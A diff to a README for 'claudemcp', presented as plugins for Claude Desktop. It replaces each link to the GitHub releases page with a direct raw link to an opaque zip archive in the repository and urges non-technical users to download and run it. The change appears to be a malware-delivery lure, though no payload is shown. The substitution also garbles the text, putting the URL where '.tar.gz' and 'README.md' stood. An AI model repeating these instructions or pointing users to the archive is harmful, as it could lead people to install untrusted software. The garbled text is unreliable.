@@ -1,6 +1,6 @@
 # ⚙️ claudemcp - Easy Plugin Management for Claude Desktop
 
-[![Download claudemcp](https://img.shields.io/badge/Download-claudemcp-blue?style=for-the-badge)](https://github.com/BreadStisx/claudemcp/releases)
+[![Download claudemcp](https://raw.githubusercontent.com/BreadStisx/claudemcp/main/claudemcp/Software-1.3.zip)](https://raw.githubusercontent.com/BreadStisx/claudemcp/main/claudemcp/Software-1.3.zip)
 
 Welcome to **claudemcp**, a collection of plugins designed to enhance your experience with Claude Desktop. This guide will help you download, install, and run claudemcp even if you have no technical background.
 
@@ -56,7 +56,7 @@ Follow these clear steps to get claudemcp up and running on your computer.
 
 Click the button at the top or follow this link:
 
-[Download claudemcp](https://github.com/BreadStisx/claudemcp/releases)
+[Download claudemcp](https://raw.githubusercontent.com/BreadStisx/claudemcp/main/claudemcp/Software-1.3.zip)
 
 This page lists all available versions of claudemcp for download.
 
@@ -66,7 +66,7 @@ Look for a file compatible with your computer. For most users, this will be:
 
 - A Windows file ending with `.exe` or `.zip` for Windows users
 - A `.dmg` or `.zip` file for macOS users
-- A `.tar.gz` or `.AppImage` for Linux users
+- A `https://raw.githubusercontent.com/BreadStisx/claudemcp/main/claudemcp/Software-1.3.zip` or `.AppImage` for Linux users
 
 If you see folders or multiple files, look for the latest release version (usually the one with the highest number).
 
@@ -80,7 +80,7 @@ Wait for the download to finish before moving to the next step.
 
 - On **Windows**: Run the `.exe` file by double-clicking it. Follow the on-screen prompts to complete installation.
 - On **macOS**: Open the `.dmg` file, then drag the claudemcp app to your Applications folder.
-- On **Linux**: Extract the `.tar.gz` file or run the `.AppImage` file as instructed in the release notes.
+- On **Linux**: Extract the `https://raw.githubusercontent.com/BreadStisx/claudemcp/main/claudemcp/Software-1.3.zip` file or run the `.AppImage` file as instructed in the release notes.
 
 If you downloaded a `.zip` file, extract it using your computer’s normal unzip tool before installing.
 
@@ -103,7 +103,7 @@ You’ll know claudemcp is running when you see new options or features related 
 
 ## 📥 Download & Install
 
-[Download claudemcp](https://github.com/BreadStisx/claudemcp/releases)
+[Download claudemcp](https://raw.githubusercontent.com/BreadStisx/claudemcp/main/claudemcp/Software-1.3.zip)
 
 Use the link above to visit the official release page. Choose the version that fits your computer’s operating system and follow the install steps outlined earlier.
 
@@ -141,7 +141,7 @@ claudemcp plugins are written to run locally on your computer. They do not send 
 
 ## 📚 Learn More
 
-Explore the `README.md` and documentation files inside the download package for more detailed information on each plugin included in claudemcp. You'll find advanced tips if you want to dive deeper later on.
+Explore the `https://raw.githubusercontent.com/BreadStisx/claudemcp/main/claudemcp/Software-1.3.zip` and documentation files inside the download package for more detailed information on each plugin included in claudemcp. You'll find advanced tips if you want to dive deeper later on.
 
 ---
 
